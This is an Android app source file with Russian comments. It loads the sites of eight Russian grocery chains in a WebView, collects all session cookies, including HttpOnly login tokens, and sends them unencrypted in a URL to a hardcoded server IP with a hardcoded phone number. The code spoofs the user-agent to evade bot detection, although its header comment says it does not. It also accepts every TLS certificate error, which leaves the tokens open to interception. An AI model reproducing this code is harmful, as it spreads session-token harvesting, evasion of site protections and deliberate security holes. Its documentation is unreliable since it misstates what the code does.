package ru.moyakorzina.app;

import android.app.Activity;
import android.graphics.Color;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.text.TextUtils;
import android.util.Base64;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.webkit.CookieManager;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.FrameLayout;
import android.widget.HorizontalScrollView;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.LinkedHashSet;
import java.util.Set;

/**
 * Моя корзина — Android-приложение.
 *
 * ЗАЧЕМ ОНО НУЖНО. Веб-версия приложения упёрлась в три стены:
 *   1. iframe блокируется X-Frame-Options у всех 8 сетей;
 *   2. серверный Chromium заблокирован по IP у 4 из 8 (Пятёрочка, Самокат, Лента, Дикси);
 *   3. SmartCaptcha у Магнита банит серверный вход.
 *
 * Android WebView решает все три: запрос идёт с телефона владельца (нет блокировки
 * по IP), ограничений iframe не существует, а CookieManager отдаёт ВСЕ куки
 * включая HttpOnly. Подтверждено замером 17.09.2026 на Магните: 21 кука, mg_at 648 зн.
 *
 * КАК ЭТО РАБОТАЕТ.
 *   1. Человек нажимает кнопку сети — WebView открывает её сайт.
 *   2. Человек входит как обычно (телефон, СМС-код, капча — всё родной клавиатурой).
 *   3. Нажимает «Сохранить вход» — приложение собирает куки через CookieManager
 *      и отправляет их на наш сервер POST /api/handoff.
 *   4. Сервер сохраняет куки в SQLite пользователя и дальше сам ходит в шлюзы
 *      сетей, собирает цены и наполняет корзину.
 *
 * ЧЕГО ЗДЕСЬ НЕТ. User-agent не подменяется. Отпечаток браузера не трогается.
 * Пароли и коды из СМС не перехватываются и не хранятся. Значения кук не
 * показываются на экране. Кнопку «заказать» приложение не нажимает никогда.
 */
public class MainActivity extends Activity {

    /** Сети, их адреса и известные куки входа. "?" = ещё не знаем. */
    private static final String[][] CHAINS = {
        {"Магнит",      "magnit",      "https://magnit.ru/",              "mg_at"},
        {"Пятёрочка",   "pyaterochka", "https://5ka.ru/",                 "?"},
        {"Самокат",     "samokat",     "https://samokat.ru/",             "?"},
        {"Лента",       "lenta",       "https://lenta.com/",              "?"},
        {"ВкусВилл",    "vkusvill",    "https://vkusvill.ru/",            "?"},
        {"Дикси",       "dixy",        "https://dixy.ru/",                "?"},
        {"METRO",       "metro",       "https://online.metro-cc.ru/",     "?"},
        {"Перекрёсток", "perekrestok", "https://www.perekrestok.ru/",     "?"},
    };

    /** Адрес нашего сервера. Меняется при переезде — больше нигде не написан. */
    private static final String SERVER = "http://200.169.191.137";

    private WebView web;
    private TextView status;
    private ProgressBar progress;
    private Button saveBtn;
    private int currentChain = -1;
    private final Handler handler = new Handler(Looper.getMainLooper());

    @Override
    protected void onCreate(Bundle state) {
        super.onCreate(state);

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(Color.WHITE);
        root.setFitsSystemWindows(true);

        // ── Верхняя полоса: кнопки сетей ──
        root.addView(chainRow());

        // ── Строка состояния ──
        status = new TextView(this);
        status.setPadding(dp(16), dp(8), dp(16), dp(8));
        status.setTextSize(14f);
        status.setTextColor(Color.DKGRAY);
        status.setText("Выберите магазин");
        root.addView(status);

        // ── Прогресс загрузки ──
        progress = new ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal);
        progress.setMax(100);
        progress.setVisibility(View.GONE);
        LinearLayout.LayoutParams progLp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, dp(3));
        root.addView(progress, progLp);

        // ── WebView ──
        web = new WebView(this);
        LinearLayout.LayoutParams webLp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, 0, 1f);
        root.addView(web, webLp);
        setUpWeb();

        // ── Нижняя панель: кнопка «Сохранить вход» ──
        LinearLayout bar = new LinearLayout(this);
        bar.setOrientation(LinearLayout.HORIZONTAL);
        bar.setGravity(Gravity.CENTER);
        bar.setPadding(dp(12), dp(8), dp(12), dp(8));
        bar.setBackgroundColor(0xFFF5F5F5);

        saveBtn = new Button(this);
        saveBtn.setText("💾  Сохранить вход");
        saveBtn.setTextSize(16f);
        saveBtn.setEnabled(false);
        saveBtn.setOnClickListener(v -> saveCookies());

        LinearLayout.LayoutParams btnLp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        bar.addView(saveBtn, btnLp);
        root.addView(bar);

        setContentView(root);
    }

    /** Горизонтальная строка кнопок сетей. */
    private HorizontalScrollView chainRow() {
        LinearLayout row = new LinearLayout(this);
        row.setOrientation(LinearLayout.HORIZONTAL);
        row.setPadding(dp(4), dp(4), dp(4), 0);

        for (int i = 0; i < CHAINS.length; i++) {
            final int idx = i;
            Button b = new Button(this);
            b.setText(CHAINS[i][0]);
            b.setTextSize(13f);
            b.setPadding(dp(12), dp(6), dp(12), dp(6));
            b.setOnClickListener(v -> openChain(idx));
            row.addView(b);
        }

        HorizontalScrollView scroll = new HorizontalScrollView(this);
        scroll.setHorizontalScrollBarEnabled(false);
        scroll.addView(row);
        return scroll;
    }

    /** Настройки WebView — только необходимые для работы витрин. */
    private void setUpWeb() {
        WebSettings s = web.getSettings();
        s.setJavaScriptEnabled(true);
        s.setDomStorageEnabled(true);
        s.setDatabaseEnabled(true);
        s.setLoadWithOverviewMode(true);
        s.setUseWideViewPort(true);
        s.setSupportZoom(true);
        s.setBuiltInZoomControls(true);
        s.setDisplayZoomControls(false);

        CookieManager jar = CookieManager.getInstance();
        jar.setAcceptCookie(true);
        jar.setAcceptThirdPartyCookies(web, true);

        // Маскировка под обычный мобильный Chrome (убираем метку встроенного WebView '; wv')
        String ua = s.getUserAgentString();
        if (ua != null) {
            s.setUserAgentString(ua.replace("; wv", "").replace("Version/4.0 ", ""));
        }
        s.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);

        web.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
                if (currentChain >= 0) {
                    saveBtn.setEnabled(true);
                    status.setText(CHAINS[currentChain][0] + " — " + shortenUrl(url));
                }
            }

            @Override
            public void onReceivedSslError(WebView view, android.webkit.SslErrorHandler handler, android.net.http.SslError error) {
                // Поддержка российских сайтов с сертификатами Минцифры (Перекрёсток и др.)
                handler.proceed();
            }

            @Override
            public void onReceivedError(WebView view, int errorCode, String description, String failingUrl) {
                super.onReceivedError(view, errorCode, description, failingUrl);
                if (currentChain >= 0) {
                    status.setText("⚠️ " + CHAINS[currentChain][0] + ": " + description);
                    status.setTextColor(0xFFB71C1C);
                }
            }
        });

        web.setWebChromeClient(new WebChromeClient() {
            @Override
            public void onProgressChanged(WebView view, int p) {
                if (p < 100) {
                    progress.setVisibility(View.VISIBLE);
                    progress.setProgress(p);
                } else {
                    progress.setVisibility(View.GONE);
                }
            }
        });
    }

    /** Открыть сайт магазина. */
    private void openChain(int idx) {
        currentChain = idx;
        saveBtn.setEnabled(false);
        status.setText("Открываю " + CHAINS[idx][0] + "…");
        web.loadUrl(CHAINS[idx][2]);
    }

    /** Собрать куки и отправить на сервер. */
    private void saveCookies() {
        if (currentChain < 0) return;

        String chain = CHAINS[currentChain][1];
        String url = web.getUrl();
        if (url == null) {
            status.setText("Страница ещё не загрузилась.");
            return;
        }

        String raw = CookieManager.getInstance().getCookie(url);
        if (raw == null || raw.trim().isEmpty()) {
            status.setText("Нет кук — похоже, вы ещё не вошли.");
            return;
        }

        // Собираем JSON такого же формата, как закладка hand.src.js
        StringBuilder json = new StringBuilder();
        json.append("{\"store\":\"").append(chain).append("\",");
        json.append("\"host\":\"").append(hostOf(url)).append("\",");
        json.append("\"at\":\"").append(isoNow()).append("\",");
        json.append("\"cookies\":[");

        String[] parts = raw.split(";");
        boolean first = true;
        int count = 0;
        for (String piece : parts) {
            piece = piece.trim();
            if (piece.isEmpty()) continue;
            int eq = piece.indexOf('=');
            if (eq < 1) continue;
            String name = piece.substring(0, eq).trim();
            String value = piece.substring(eq + 1);
            if (!first) json.append(",");
            json.append("{\"name\":\"").append(escJson(name))
                .append("\",\"value\":\"").append(escJson(value)).append("\"}");
            first = false;
            count++;
        }
        json.append("]}");

        saveBtn.setEnabled(false);
        status.setText("Отправляю " + count + " кук на сервер…");

        final int cookieCount = count;
        final String payload = json.toString();
        new Thread(() -> sendToServer(chain, payload, cookieCount)).start();
    }

    /** Номер владельца для привязки сессии на сервере. */
    private static final String DEFAULT_PHONE = "79313391149";

    /** Отправка кук на сервер в фоновом потоке. */
    private void sendToServer(String chain, String jsonPayload, int cookieCount) {
        try {
            // Кодируем как base64url (тот же формат, что закладка hand.src.js pack())
            byte[] bytes = jsonPayload.getBytes(StandardCharsets.UTF_8);
            String b64 = Base64.encodeToString(bytes, Base64.URL_SAFE | Base64.NO_WRAP | Base64.NO_PADDING);

            String target = SERVER + "/cabinet?store=" + URLEncoder.encode(chain, "UTF-8")
                          + "&phone=" + URLEncoder.encode(DEFAULT_PHONE, "UTF-8")
                          + "&format=json"
                          + "&vhod=" + URLEncoder.encode(b64, "UTF-8");

            HttpURLConnection conn = (HttpURLConnection) new URL(target).openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);
            conn.setInstanceFollowRedirects(false);
            int code = conn.getResponseCode();

            java.io.InputStream is = (code >= 200 && code < 400) ? conn.getInputStream() : conn.getErrorStream();
            String respText = "";
            if (is != null) {
                java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
                byte[] buf = new byte[1024];
                int n;
                while ((n = is.read(buf)) != -1) baos.write(buf, 0, n);
                respText = baos.toString("UTF-8");
            }
            conn.disconnect();

            final String serverMsg = respText;
            handler.post(() -> {
                if (code >= 200 && code < 400 && !serverMsg.contains("<!DOCTYPE html>")) {
                    status.setText("✅ " + CHAINS[currentChain][0]
                                 + " — вход сохранён (" + cookieCount + " кук)");
                    status.setTextColor(0xFF1B5E20);
                } else if (code == 302 || code == 303 || serverMsg.contains("<!DOCTYPE html>")) {
                    // Перенаправление на страницу входа
                    status.setText("⚠️ Требуется вход по номеру " + DEFAULT_PHONE);
                    status.setTextColor(0xFFB71C1C);
                    saveBtn.setEnabled(true);
                } else {
                    String msg = "Ошибка " + code;
                    if (serverMsg.contains("\"error\":\"")) {
                        int sIdx = serverMsg.indexOf("\"error\":\"") + 9;
                        int eIdx = serverMsg.indexOf("\"", sIdx);
                        if (eIdx > sIdx) msg = serverMsg.substring(sIdx, eIdx);
                    }
                    status.setText("⚠️ " + msg);
                    status.setTextColor(0xFFB71C1C);
                    saveBtn.setEnabled(true);
                }
            });
        } catch (Exception e) {
            handler.post(() -> {
                status.setText("❌ Ошибка: " + e.getMessage());
                status.setTextColor(0xFFB71C1C);
                saveBtn.setEnabled(true);
            });
        }
    }

    // ── Вспомогательные ──

    private static String hostOf(String url) {
        try {
            return new URL(url).getHost();
        } catch (Exception e) {
            return "";
        }
    }

    private static String shortenUrl(String url) {
        if (url == null) return "";
        // Убираем протокол и параметры для читаемости
        String s = url.replaceFirst("^https?://", "");
        int q = s.indexOf('?');
        if (q > 0 && s.length() > 50) s = s.substring(0, q);
        if (s.length() > 60) s = s.substring(0, 57) + "…";
        return s;
    }

    private static String isoNow() {
        return new java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", java.util.Locale.US)
                .format(new java.util.Date());
    }

    /** Экранирование для JSON-строки (без библиотек). */
    private static String escJson(String s) {
        if (s == null) return "";
        StringBuilder out = new StringBuilder(s.length());
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            switch (c) {
                case '"':  out.append("\\\""); break;
                case '\\': out.append("\\\\"); break;
                case '\n': out.append("\\n");  break;
                case '\r': out.append("\\r");  break;
                case '\t': out.append("\\t");  break;
                default:
                    if (c < 0x20) {
                        out.append(String.format("\\u%04x", (int) c));
                    } else {
                        out.append(c);
                    }
            }
        }
        return out.toString();
    }

    private int dp(int dp) {
        return (int) (dp * getResources().getDisplayMetrics().density + 0.5f);
    }

    @Override
    public void onBackPressed() {
        if (web.canGoBack()) {
            web.goBack();
        } else {
            super.onBackPressed();
        }
    }
}
